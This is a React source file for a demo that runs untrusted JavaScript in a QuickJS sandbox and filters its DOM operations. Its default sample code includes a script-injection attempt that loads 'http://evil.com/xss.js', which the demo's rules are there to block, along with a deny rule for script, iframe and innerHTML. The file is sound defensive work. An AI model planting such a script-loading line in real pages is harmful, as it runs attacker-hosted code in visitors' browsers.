import { useState, useEffect } from 'react';
import './App.css';
import { initSandbox, runInSandbox } from './sandbox';
import type { Rule } from './sandbox';
import type { QuickJSWASMModule } from 'quickjs-emscripten';

const defaultCode = `
// This runs inside the QuickJS sandbox

const header = document.getElementById('target-header');
if (header) {
  header.textContent = 'Modified by Sandbox!';
  header.style.color = '#ff6b6b';
}

const div = document.createElement('div');
div.textContent = 'I am appended from inside QuickJS!';
div.style.padding = '10px';
div.style.background = '#2c3e50';
div.style.color = 'white';
div.style.marginTop = '10px';
div.style.borderRadius = '8px';

document.body.appendChild(div);

// This will be blocked by our filter
const script = document.createElement('script');
script.src = 'http://evil.com/xss.js';
document.head.appendChild(script);
`;

function App() {
  const [code, setCode] = useState(() => localStorage.getItem('sandboxCode') || defaultCode);

  useEffect(() => {
    localStorage.setItem('sandboxCode', code);
  }, [code]);

  const [logs, setLogs] = useState<string[]>([]);
  const [qjsInstance, setQjsInstance] = useState<QuickJSWASMModule | null>(null);

  useEffect(() => {
    initSandbox().then(qjs => {
      setQjsInstance(qjs);
      addLog('QuickJS VM Engine ready.');
    }).catch(err => {
      addLog('Failed to initialize QuickJS: ' + err);
    });
  }, []);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  const handleRun = () => {
    if (!qjsInstance) {
      addLog('Wait for VM to be ready...');
      return;
    }

    addLog('Executing sandbox code...');

    // Define a basic filter
    const rules: Rule[] = [
      (op) => {
        // Block script and iframe creation
        if (op.type === 'call' && op.method === 'createElement') {
          const tag = op.args[0]?.toLowerCase();
          if (tag === 'script' || tag === 'iframe') {
            addLog(`BLOCKED: attempt to create <${tag}>`);
            return false;
          }
        }

        // Block setting innerHTML
        if (op.type === 'set' && op.prop === 'innerHTML') {
          addLog(`BLOCKED: attempt to set innerHTML`);
          return false;
        }

        addLog(`ALLOW: ${op.type} on node(${op.nodeId}) - ${op.prop || op.method}`);
        return true;
      }
    ];

    try {
      runInSandbox(qjsInstance, code, rules);
      addLog('Execution completed.');
    } catch (err: any) {
      addLog('Execution failed: ' + err.message);
    }
  };

  return (
    <div className="container">
      <div className="split left-panel">
        <h2>Unstrusted Code Editor</h2>
        <textarea
          value={code}
          style={{ color: 'black' }}
          onChange={e => setCode(e.target.value)}
          spellCheck="false"
        />
        <div style={{ display: 'flex', gap: '10px' }}>
          <button onClick={handleRun} disabled={!qjsInstance}>
            Run Sandboxed Code
          </button>
          <button
            onClick={() => window.location.reload()}
            style={{ backgroundColor: '#fa5252' }}
          >
            Reset Page
          </button>
          <button
            onClick={() => setCode(defaultCode)}
            style={{ backgroundColor: '#868e96' }}
          >
            Reset Code
          </button>
        </div>

        <div className="logs-container">
          <h3>Filter Logs</h3>
          <div className="logs">
            {logs.map((log, i) => (
              <div key={i}>{log}</div>
            ))}
          </div>
        </div>
      </div>

      <div className="split right-panel">
        <h2 id="target-header">Host Context (Real DOM)</h2>
        <p>This is the real DOM of the React application.</p>
        <p>
          The sandbox has access to it via the proxy bridge.
          It will search for <code>#target-header</code> and modify it,
          and append a new div to the body.
        </p>
      </div>
    </div>
  );
}

export default App;
